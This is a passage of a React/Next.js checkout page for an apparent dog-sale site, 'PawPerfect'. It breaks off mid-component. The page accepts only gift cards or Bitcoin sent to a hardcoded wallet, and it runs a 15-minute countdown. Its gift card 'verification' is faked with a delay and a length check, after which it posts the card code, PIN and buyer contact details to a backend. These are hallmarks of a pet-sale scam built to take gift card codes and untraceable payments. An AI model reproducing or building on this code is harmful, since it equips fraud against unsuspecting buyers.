"use client";
import { useState, useEffect } from 'react';
import { useParams, useRouter } from 'next/navigation';
import Head from 'next/head';
import Image from 'next/image';
import Link from 'next/link';
import { FaChevronLeft, FaUser, FaEnvelope, FaMapMarkerAlt, FaCreditCard, FaGift, FaBitcoin, FaTag, FaCheck, FaExternalLinkAlt, FaExclamationTriangle, FaCopy, FaDollarSign } from 'react-icons/fa';

// Import your dog data from the data folder
import { dogs } from '@/data/index';

const Page = () => {
  const params = useParams();
  const router = useRouter();
  const dogId = params?.id ? parseInt(params.id) : null;
  
  const [currentStep, setCurrentStep] = useState(1);
  const [copied, setCopied] = useState(false);
  const [copiedPrice, setCopiedPrice] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60);
  const [paymentStatus, setPaymentStatus] = useState('pending');
  const [selectedDog, setSelectedDog] = useState(null);
  const [loading, setLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [giftCardVerified, setGiftCardVerified] = useState(false);
  const [verifyingGiftCard, setVerifyingGiftCard] = useState(false);
  const [btcPrice, setBtcPrice] = useState(45000);
  const [paymentError, setPaymentError] = useState('');
  const [showPaymentInstructions, setShowPaymentInstructions] = useState(false);
  
  // Form state
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    confirmEmail: '',
    phone: '',
    addressLine1: '',
    addressLine2: '',
    city: '',
    state: '',
    country: '',
    postcode: '',
    paymentMethod: 'crypto',
    giftCardCode: '',
    giftCardPin: '',
    giftCardProvider: '',
    acceptTerms: false,
    acceptMarketing: false
  });

  const [errors, setErrors] = useState({});
  const walletAddress = 'bc1q4p3sgwq5052glcrjwu4rs48m0qtpfnkpzjezeh';

  // Fetch dog data
  useEffect(() => {
    if (dogId) {
      const dog = dogs.find(d => d.id === dogId);
      if (dog) {
        setSelectedDog(dog);
      }
      setLoading(false);
    }
  }, [dogId]);

  const ticket = selectedDog ? {
    price: parseFloat(selectedDog.price),
    numberOfDog: 1,
    application: 'PawPerfect',
    breed: selectedDog.breed,
    dogName: selectedDog.name,
    age: selectedDog.age,
    gender: selectedDog.gender,
    location: selectedDog.location,
    image: selectedDog.img,
    description: selectedDog.desc
  } : {
    price: 0,
    numberOfDog: 0,
    application: 'PawPerfect',
    breed: '',
    dogName: '',
    age: '',
    gender: '',
    location: '',
    image: '',
    description: ''
  };

  // Calculate BTC amount based on current price
  const calculateBtcAmount = () => {
    const gbpToUsdRate = 1.25;
    const amountUSD = ticket.price * gbpToUsdRate * 1.1;
    return (amountUSD / btcPrice).toFixed(8);
  };

  // Get total amount
  const getTotalAmount = () => {
    return (ticket.price + 2.50).toFixed(2);
  };

  // Copy BTC address to clipboard
  const copyToClipboard = async (text, type = 'address') => {
    try {
      await navigator.clipboard.writeText(text);
      if (type === 'address') {
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } else {
        setCopiedPrice(true);
        setTimeout(() => setCopiedPrice(false), 2000);
      }
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  // Copy both address and price with instructions
  const copyPaymentDetails = async (provider) => {
    const paymentDetails = `Payment Details:
BTC Address: ${walletAddress}
Amount: $${getTotalAmount()}
BTC Amount: ~${calculateBtcAmount()} BTC

Instructions:
1. Go to ${provider} 
2. Purchase $${getTotalAmount()} worth of Bitcoin (~${calculateBtcAmount()} BTC)
3. Send to the BTC address above
4. Keep the transaction receipt`;

    try {
      await navigator.clipboard.writeText(paymentDetails);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
      
      // Show payment instructions
      setShowPaymentInstructions(true);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  // Redirect to payment provider
  const redirectToProvider = (provider) => {
    const providers = {
      'moonpay': 'https://buy.moonpay.com/',
      'paybis': 'https://paybis.com/',
      'coinmama': 'https://www.coinmama.com/',
      'binance': 'https://www.binance.com/en/buy-Bitcoin',
      'coinbase': 'https://www.coinbase.com/price/bitcoin',
      'kraken': 'https://www.kraken.com/'
    };

    const url = providers[provider];
    if (url) {
      window.open(url, '_blank', 'noopener,noreferrer');
    }
  };

  // Validation rules
  const validateStep = (step) => {
    const newErrors = {};

    if (step === 1) {
      if (!formData.firstName.trim()) newErrors.firstName = 'First name is required';
      if (!formData.lastName.trim()) newErrors.lastName = 'Last name is required';
      if (!formData.email.trim()) newErrors.email = 'Email is required';
      else if (!/\S+@\S+\.\S+/.test(formData.email)) newErrors.email = 'Email is invalid';
      if (!formData.confirmEmail.trim()) newErrors.confirmEmail = 'Please confirm your email';
      else if (formData.email !== formData.confirmEmail) newErrors.confirmEmail = 'Emails do not match';
      if (!formData.phone.trim()) newErrors.phone = 'Phone number is required';
    }

    if (step === 2) {
      if (!formData.addressLine1.trim()) newErrors.addressLine1 = 'Address line 1 is required';
      if (!formData.city.trim()) newErrors.city = 'City is required';
      if (!formData.state.trim()) newErrors.state = 'State/Province is required';
      if (!formData.country.trim()) newErrors.country = 'Country is required';
      if (!formData.postcode.trim()) newErrors.postcode = 'Postcode is required';
    }

    if (step === 3) {
      if (!formData.acceptTerms) newErrors.acceptTerms = 'You must accept the terms and conditions';
      
      if (formData.paymentMethod === 'gift-card') {
        if (!formData.giftCardCode.trim()) {
          newErrors.giftCardCode = 'Gift card code is required';
        }
        if (!formData.giftCardProvider) {
          newErrors.giftCardProvider = 'Please select gift card provider';
        }
        if (!giftCardVerified) {
          newErrors.giftCardCode = 'Please verify your gift card before proceeding';
        }
      }
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleInputChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: type === 'checkbox' ? checked : value
    }));
    
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
    
    if (name === 'giftCardCode' && giftCardVerified) {
      setGiftCardVerified(false);
    }
  };

  const handleNextStep = () => {
    if (validateStep(currentStep)) {
      setCurrentStep(prev => prev + 1);
    }
  };

  const handlePreviousStep = () => {
    setCurrentStep(prev => prev - 1);
  };

  // Verify gift card
  const verifyGiftCard = async () => {
    if (!formData.giftCardCode.trim() || !formData.giftCardProvider) {
      setErrors({
        giftCardCode: !formData.giftCardCode.trim() ? 'Gift card code is required' : '',
        giftCardProvider: !formData.giftCardProvider ? 'Please select gift card provider' : ''
      });
      return;
    }

    setVerifyingGiftCard(true);
    
    try {
      await new Promise(resolve => setTimeout(resolve, 2000));
      const isValid = formData.giftCardCode.length >= 10;
      
      if (isValid) {
        setGiftCardVerified(true);
        setErrors(prev => ({ ...prev, giftCardCode: '' }));
      } else {
        setGiftCardVerified(false);
        setErrors(prev => ({ ...prev, giftCardCode: 'Invalid gift card code format' }));
      }
    } catch (error) {
      console.error('Error verifying gift card:', error);
      setGiftCardVerified(false);
      setErrors(prev => ({ ...prev, giftCardCode: 'Verification failed. Please try again.' }));
    } finally {
      setVerifyingGiftCard(false);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateStep(3)) {
      setIsSubmitting(true);
      
      if (formData.paymentMethod === 'gift-card' && !giftCardVerified) {
        setErrors({ giftCardCode: 'Please verify your gift card first' });
        setIsSubmitting(false);
        return;
      }
      
      if (formData.paymentMethod === 'gift-card') {
        try {
          const response = await fetch('/api/gift-card/verify', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              giftCardCode: formData.giftCardCode,
              giftCardPin: formData.giftCardPin,
              giftCardProvider: formData.giftCardProvider,
              customerEmail: formData.email,
              customerPhone: formData.phone,
              customerName: `${formData.firstName} ${formData.lastName}`,
              orderAmount: getTotalAmount(),
              dogDetails: {
                dogName: ticket.dogName,
                breed: ticket.breed,
                price: ticket.price
              }
            }),
          });

          const data = await response.json();
          if (data.success) {
            console.log('Emails sent successfully');
          } else {
            console.error('Failed to send emails:', data.error);
          }
        } catch (error) {
          console.error('Error sending emails:', error);
        }
      }
      
      const orderData = {
        ...formData,
        dog: selectedDog,
        totalAmount: getTotalAmount(),
        orderDate: new Date().toISOString()
      };
      
      console.log('Order submitted:', orderData);
      
      setTimeout(() => {
        setIsSubmitting(false);
        setCurrentStep(4);
        if (formData.paymentMethod === 'crypto') {
          setTimeLeft(15 * 60);
        }
      }, 1000);
    }
  };

  const handlePaymentMethodSelect = (method) => {
    setFormData(prev => ({
      ...prev,
      paymentMethod: method,
      giftCardProvider: method === 'gift-card' ? prev.giftCardProvider : ''
    }));
    
    if (method !== 'gift-card') {
      setGiftCardVerified(false);
    }
    
    setPaymentError('');
    setShowPaymentInstructions(false);
  };

  // Handle Buy Bitcoin with Card - Copy details and show instructions
  const handleBuyBitcoinWithCard = (provider = 'moonpay') => {
    if (!formData.email || !formData.firstName || !formData.lastName) {
      setPaymentError('Please complete your personal information first');
      setCurrentStep(1);
      return;
    }

    // Copy payment details to clipboard
    copyPaymentDetails(provider);
  };

  const handleExternalPayment = (type) => {
    const orderData = {
      ...formData,
      dog: selectedDog,
      totalAmount: getTotalAmount(),
      paymentMethod: type,
      orderDate: new Date().toISOString()
    };

    console.log('Order data for external payment:', orderData);

    switch (type) {
      case 'amazon-gift-card':
        window.open('https://www.amazon.com/gift-cards/b?ie=UTF8&node=2238192011', '_blank');
        break;
      case 'itunes-gift-card':
        window.open('https://www.mygiftcardsupply.com/shop/itunes-gift-cards/', '_blank');
        break;
      case 'paybis-btc':
        window.open('https://paybis.com/', '_blank');
        break;
      default:
        break;
    }
  };

  // Timer useEffect
  useEffect(() => {
    if (timeLeft <= 0) {
      setPaymentStatus('expired');
      return;
    }

    if (currentStep === 4 && timeLeft > 0 && formData.paymentMethod === 'crypto') {
      const timer = setInterval(() => {
        setTimeLeft((prevTime) => prevTime - 1);
      }, 1000);

      return () => clearInterval(timer);
    }
  }, [timeLeft, currentStep, formData.paymentMethod]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const steps = [
    { number: 1, title: 'Personal Info', icon: <FaUser /> },
    { number: 2, title: 'Delivery Address', icon: <FaMapMarkerAlt /> },
    { number: 3, title: 'Payment Method', icon: <FaCreditCard /> },
    { number: 4, title: 'Complete Payment', icon: <FaCreditCard /> }
  ];

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
          <p className="mt-4 text-gray-600">Loading dog information...</p>
        </div>
      </div>
    );
  }

  if (!selectedDog) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Dog Not Found</h2>
          <p className="text-gray-600 mb-4">The dog you're looking for doesn't exist.</p>
          <Link href="/" className="text-blue-600 hover:text-blue-800">
            Return to Home
          </Link>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8 px-4 sm:px-6 lg:px-8">
      <div className="max-w-2xl mt-[7rem] mx-auto">
        {/* Progress Bar */}
        <div className="mb-8">
          <div className="flex items-center justify-between">
            {steps.map((step, index) => (
              <div key={step.number} className="flex items-center">
                <div className={`flex items-center justify-center w-10 h-10 rounded-full ${
                  currentStep >= step.number 
                    ? 'bg-blue-600 text-white' 
                    : 'bg-gray-300 text-gray-600'
                }`}>
                  {step.icon}
                </div>
                <span className={`ml-2 text-sm font-medium ${
                  currentStep >= step.number ? 'text-blue-600' : 'text-gray-500'
                }`}>
                  {step.title}
                </span>
                {index < steps.length - 1 && (
                  <div className={`w-16 h-1 mx-4 ${
                    currentStep > step.number ? 'bg-blue-600' : 'bg-gray-300'
                  }`} />
                )}
              </div>
            ))}
          </div>
        </div>

        {/* Payment Error Alert */}
        {paymentError && (
          <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg flex items-start">
            <FaExclamationTriangle className="text-red-500 mt-0.5 mr-3 flex-shrink-0" />
            <div>
              <h4 className="text-red-800 font-semibold">Payment Error</h4>
              <p className="text-red-700 text-sm mt-1">{paymentError}</p>
            </div>
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Content */}
          <div className="lg:col-span-2">
            <div className="bg-white rounded-xl shadow-md overflow-hidden">
              <div className="p-6">
                {/* Step 1: Personal Information */}
                {currentStep === 1 && (
                  <div>
                    <h2 className="text-2xl font-bold text-gray-900 mb-6">Personal Information</h2>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          First Name *
                        </label>
                        <input
                          type="text"
                          name="firstName"
                          value={formData.firstName}
                          onChange={handleInputChange}
                          className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                            errors.firstName ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.firstName && (
                          <p className="mt-1 text-sm text-red-600">{errors.firstName}</p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Last Name *
                        </label>
                        <input
                          type="text"
                          name="lastName"
                          value={formData.lastName}
                          onChange={handleInputChange}
                          className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                            errors.lastName ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.lastName && (
                          <p className="mt-1 text-sm text-red-600">{errors.lastName}</p>
                        )}
                      </div>
                    </div>
                    
                    <div className="mt-4">
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Email Address *
                      </label>
                      <input
                        type="email"
                        name="email"
                        value={formData.email}
                        onChange={handleInputChange}
                        className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                          errors.email ? 'border-red-500' : 'border-gray-300'
                        }`}
                      />
                      {errors.email && (
                        <p className="mt-1 text-sm text-red-600">{errors.email}</p>
                      )}
                    </div>

                    <div className="mt-4">
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Confirm Email Address *
                      </label>
                      <input
                        type="email"
                        name="confirmEmail"
                        value={formData.confirmEmail}
                        onChange={handleInputChange}
                        className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                          errors.confirmEmail ? 'border-red-500' : 'border-gray-300'
                        }`}
                      />
                      {errors.confirmEmail && (
                        <p className="mt-1 text-sm text-red-600">{errors.confirmEmail}</p>
                      )}
                    </div>

                    <div className="mt-4">
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        WhatsApp Number *
                      </label>
                      <input
                        type="tel"
                        name="phone"
                        value={formData.phone}
                        onChange={handleInputChange}
                        className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                          errors.phone ? 'border-red-500' : 'border-gray-300'
                        }`}
                      />
                      {errors.phone && (
                        <p className="mt-1 text-sm text-red-600">{errors.phone}</p>
                      )}
                    </div>
                  </div>
                )}

                {/* Step 2: Delivery Address */}
                {currentStep === 2 && (
                  <div>
                    <h2 className="text-2xl font-bold text-gray-900 mb-6">Delivery Address</h2>
                    
                    <div className="mt-4">
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Address Line 1 *
                      </label>
                      <input
                        type="text"
                        name="addressLine1"
                        value={formData.addressLine1}
                        onChange={handleInputChange}
                        className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                          errors.addressLine1 ? 'border-red-500' : 'border-gray-300'
                        }`}
                      />
                      {errors.addressLine1 && (
                        <p className="mt-1 text-sm text-red-600">{errors.addressLine1}</p>
                      )}
                    </div>

                    <div className="mt-4">
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Address Line 2
                      </label>
                      <input
                        type="text"
                        name="addressLine2"
                        value={formData.addressLine2}
                        onChange={handleInputChange}
                        className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                      />
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          City *
                        </label>
                        <input
                          type="text"
                          name="city"
                          value={formData.city}
                          onChange={handleInputChange}
                          className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                            errors.city ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.city && (
                          <p className="mt-1 text-sm text-red-600">{errors.city}</p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          State/Province *
                        </label>
                        <input
                          type="text"
                          name="state"
                          value={formData.state}
                          onChange={handleInputChange}
                          className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                            errors.state ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.state && (
                          <p className="mt-1 text-sm text-red-600">{errors.state}</p>
                        )}
                      </div>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Country *
                        </label>
                        <input
                          type="text"
                          name="country"
                          value={formData.country}
                          onChange={handleInputChange}
                          className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                            errors.country ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.country && (
                          <p className="mt-1 text-sm text-red-600">{errors.country}</p>
                        )}
                      </div>
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Postcode *
                        </label>
                        <input
                          type="text"
                          name="postcode"
                          value={formData.postcode}
                          onChange={handleInputChange}
                          className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                            errors.postcode ? 'border-red-500' : 'border-gray-300'
                          }`}
                        />
                        {errors.postcode && (
                          <p className="mt-1 text-sm text-red-600">{errors.postcode}</p>
                        )}
                      </div>
                    </div>
                  </div>
                )}

                {/* Step 3: Payment Method Selection */}
                {currentStep === 3 && (
                  <div>
                    <h2 className="text-2xl font-bold text-gray-900 mb-6">Select Payment Method</h2>
                    
                    {/* Gift Card Payment Option */}
                    <div className="mb-8">
                      <h3 className="text-lg font-semibold mb-4 flex items-center">
                        <FaGift className="text-purple-500 mr-2" />
                        Gift Card Payment
                      </h3>
                      
                      <div 
                        className={`border-2 rounded-lg p-4 mb-4 cursor-pointer transition-all ${
                          formData.paymentMethod === 'gift-card' 
                            ? 'border-blue-500 bg-blue-50' 
                            : 'border-gray-200 hover:border-gray-300'
                        }`}
                        onClick={() => handlePaymentMethodSelect('gift-card')}
                      >
                        <div className="flex items-center justify-between mb-4">
                          <div className="flex items-center">
                            <div className="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center mr-3">
                              <FaGift className="text-purple-500" />
                            </div>
                            <div>
                              <h4 className="font-semibold">Redeem Gift Card</h4>
                              <p className="text-sm text-gray-600">Use your existing gift card</p>
                            </div>
                          </div>
                          <div className={`w-4 h-4 rounded-full border-2 ${
                            formData.paymentMethod === 'gift-card' 
                              ? 'bg-blue-500 border-blue-500' 
                              : 'border-gray-300'
                          }`}></div>
                        </div>

                        {/* Gift Card Form */}
                        {formData.paymentMethod === 'gift-card' && (
                          <div className="mt-4 p-4 bg-gray-50 rounded-lg">
                            <div className="mb-4">
                              <label className="block text-sm font-medium text-gray-700 mb-2">
                                Gift Card Provider *
                              </label>
                              <select
                                name="giftCardProvider"
                                value={formData.giftCardProvider}
                                onChange={handleInputChange}
                                className={`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                                  errors.giftCardProvider ? 'border-red-500' : 'border-gray-300'
                                }`}
                              >
                                <option value="">Select Provider</option>
                                <option value="amazon">Amazon Gift Card</option>
                                <option value="itunes">iTunes Gift Card</option>
                                <option value="google-play">Google Play Gift Card</option>
                                <option value="steam">Steam Gift Card</option>
                                <option value="other">Other Gift Card</option>
                              </select>
                              {errors.giftCardProvider && (
                                <p className="mt-1 text-sm text-red-600">{errors.giftCardProvider}</p>
                              )}
                            </div>

                            <div className="mb-4">
                              <label className="block text-sm font-medium text-gray-700 mb-2">
                                Gift Card Code *
                              </label>
                              <div className="flex space-x-2">
                                <input
                                  type="text"
                                  name="giftCardCode"
                                  value={formData.giftCardCode}
                                  onChange={handleInputChange}
                                  placeholder="Enter gift card code"
                                  className={`flex-1 px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 ${
                                    errors.giftCardCode ? 'border-red-500' : 'border-gray-300'
                                  }`}
                                />
                                <button
                                  type="button"
                                  onClick={verifyGiftCard}
                                  disabled={verifyingGiftCard || !formData.giftCardCode.trim() || !formData.giftCardProvider}
                                  className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 transition-colors flex items-center"
                                >
                                  {verifyingGiftCard ? (
                                    <>
                                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                                      Verifying...
                                    </>
                                  ) : giftCardVerified ? (
                                    <>
                                      <FaCheck className="mr-2" />
                                      Verified
                                    </>
                                  ) : (
                                    'Verify'
                                  )}
                                </button>
                              </div>
                              {errors.giftCardCode && (
                                <p className="mt-1 text-sm text-red-600">{errors.giftCardCode}</p>
                              )}
                              {giftCardVerified && (
                                <p className="mt-1 text-sm text-green-600 flex items-center">
                                  <FaTag className="mr-1" /> Gift card verified successfully!
                                </p>
                              )}
                            </div>

                            <div className="mb-4">
                              <label className="block text-sm font-medium text-gray-700 mb-2">
                                Gift Card PIN (Optional)
                              </label>
                              <input
                                type="text"
                                name="giftCardPin"
                                value={formData.giftCardPin}
                                onChange={handleInputChange}
                                placeholder="Enter PIN if required"
                                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500"
                              />
                            </div>

                            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                              <p className="text-sm text-yellow-700">
                                <strong>Note:</strong> Please verify your gift card before completing the order. 
                                This ensures the code is valid and properly formatted.
                              </p>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Crypto Payment Options */}
                    <div className="mb-8">
                      <h3 className="text-lg font-semibold mb-4 flex items-center">
                        <FaBitcoin className="text-orange-500 mr-2" />
                        Cryptocurrency Payments
                      </h3>
                      
                      {/* Direct BTC Payment */}
                      <div 
                        className={`border-2 rounded-lg p-4 mb-4 cursor-pointer transition-all ${
                          formData.paymentMethod === 'crypto' 
                            ? 'border-blue-500 bg-blue-50' 
                            : 'border-gray-200 hover:border-gray-300'
                        }`}
                        onClick={() => handlePaymentMethodSelect('crypto')}
                      >
                        <div className="flex items-center justify-between">
                          <div className="flex items-center">
                            <div className="w-10 h-10 bg-orange-100 rounded-full flex items-center justify-center mr-3">
                              <FaBitcoin className="text-orange-500" />
                            </div>
                            <div>
                              <h4 className="font-semibold">Direct Bitcoin Payment</h4>
                              <p className="text-sm text-gray-600">Pay directly with Bitcoin</p>
                            </div>
                          </div>
                          <div className={`w-4 h-4 rounded-full border-2 ${
                            formData.paymentMethod === 'crypto' 
                              ? 'bg-blue-500 border-blue-500' 
                              : 'border-gray-300'
                          }`}></div>
                        </div>
                      </div>

                      {/* NEW: Buy Bitcoin with Card Option */}
                      <div 
                        className={`border-2 rounded-lg p-4 mb-4 cursor-pointer transition-all ${
                          formData.paymentMethod === 'buy-btc-with-card' 
                            ? 'border-blue-500 bg-blue-50' 
                            : 'border-gray-200 hover:border-gray-300'
                        }`}
                        onClick={() => handlePaymentMethodSelect('buy-btc-with-card')}
                      >
                        <div className="flex items-center justify-between">
                          <div className="flex items-center">
                            <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center mr-3">
                              <FaCreditCard className="text-green-500" />
                            </div>
                            <div>
                              <h4 className="font-semibold">Buy Bitcoin with Card</h4>
                              <p className="text-sm text-gray-600">Purchase BTC with credit/debit card</p>
                            </div>
                          </div>
                          <div className={`w-4 h-4 rounded-full border-2 ${
                            formData.paymentMethod === 'buy-btc-with-card' 
                              ? 'bg-blue-500 border-blue-500' 
                              : 'border-gray-300'
                          }`}></div>
                        </div>

                        {/* Buy BTC with Card Details */}
                        {formData.paymentMethod === 'buy-btc-with-card' && (
                          <div className="mt-4 p-4 bg-gray-50 rounded-lg">
                            <div className="mb-4">
                              <h5 className="font-semibold text-gray-700 mb-2">How it works:</h5>
                              <ul className="text-sm text-gray-600 space-y-1">
                                <li>• Click any provider button below</li>
                                <li>• BTC address & amount will be copied automatically</li>
                                <li>• You'll be redirected to the payment provider</li>
                                <li>• Paste the BTC address when prompted</li>
                                <li>• Complete your purchase</li>
                              </ul>
                            </div>
                            
                            <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
                              <div className="flex justify-between items-center mb-2">
                                <p className="text-sm text-blue-700 font-semibold">Payment Details:</p>
                                <button
                                  onClick={() => copyPaymentDetails('selected provider')}
                                  className="text-xs bg-blue-600 text-white px-2 py-1 rounded hover:bg-blue-700"
                                >
                                  Copy All
                                </button>
                              </div>
                              <p className="text-xs text-blue-600">
                                <strong>Amount:</strong> ${getTotalAmount()} (~{calculateBtcAmount()} BTC)
                              </p>
                              <p className="text-xs text-blue-600 mt-1 truncate">
                                <strong>BTC Address:</strong> {walletAddress}
                              </p>
                            </div>

                            <div className="grid grid-cols-2 gap-2 mb-4">
                              <button
                                onClick={() => handleBuyBitcoinWithCard('moonpay')}
                                className="px-3 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors text-sm flex items-center justify-center"
                              >
                                <FaCopy className="mr-1" />
                                MoonPay
                              </button>
                              <button
                                onClick={() => handleBuyBitcoinWithCard('paybis')}
                                className="px-3 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 transition-colors text-sm flex items-center justify-center"
                              >
                                <FaCopy className="mr-1" />
                                Paybis
                              </button>
                              <button
                                onClick={() => handleBuyBitcoinWithCard('coinmama')}
                                className="px-3 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 transition-colors text-sm flex items-center justify-center"
                              >
                                <FaCopy className="mr-1" />
                                CoinMama
                              </button>
                              <button
                                onClick={() => handleBuyBitcoinWithCard('binance')}
                                className="px-3 py-2 bg-yellow-600 text-white rounded-md hover:bg-yellow-700 focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:ring-offset-2 transition-colors text-sm flex items-center justify-center"
                              >
                                <FaCopy className="mr-1" />
                                Binance
                              </button>
                            </div>

                            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                              <p className="text-xs text-yellow-700">
                                <strong>Note:</strong> BTC address and payment amount copied to clipboard. You'll be redirected to complete the purchase.
                              </p>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Payment Instructions Modal */}
                    {showPaymentInstructions && (
                      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
                        <div className="bg-white rounded-lg max-w-md w-full p-6">
                          <div className="text-center mb-4">
                            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
                              <FaCheck className="text-green-600 text-2xl" />
                            </div>
                            <h3 className="text-xl font-bold text-gray-900 mb-2">
                              Payment Details Copied!
                            </h3>
                            <p className="text-gray-600 mb-4">
                              BTC address and payment amount have been copied to your clipboard.
                            </p>
                          </div>

                          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
                            <h4 className="font-semibold text-blue-800 mb-2">Next Steps:</h4>
                            <ol className="text-sm text-blue-700 space-y-2">
                              <li className="flex items-start">
                                <span className="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-2 mt-0.5 flex-shrink-0">1</span>
                                <span>Click a provider below to open their website</span>
                              </li>
                              <li className="flex items-start">
                                <span className="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-2 mt-0.5 flex-shrink-0">2</span>
                                <span>Paste the BTC address when asked for recipient address</span>
                              </li>
                              <li className="flex items-start">
                                <span className="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-2 mt-0.5 flex-shrink-0">3</span>
                                <span>Enter amount: <strong>${getTotalAmount()}</strong> or <strong>{calculateBtcAmount()} BTC</strong></span>
                              </li>
                              <li className="flex items-start">
                                <span className="bg-blue-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs mr-2 mt-0.5 flex-shrink-0">4</span>
                                <span>Complete your purchase and keep the receipt</span>
                              </li>
                            </ol>
                          </div>

                          <div className="grid grid-cols-2 gap-3 mb-4">
                            <button
                              onClick={() => redirectToProvider('moonpay')}
                              className="px-3 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-colors text-sm flex items-center justify-center"
                            >
                              <FaExternalLinkAlt className="mr-1" />
                              MoonPay
                            </button>
                            <button
                              onClick={() => redirectToProvider('paybis')}
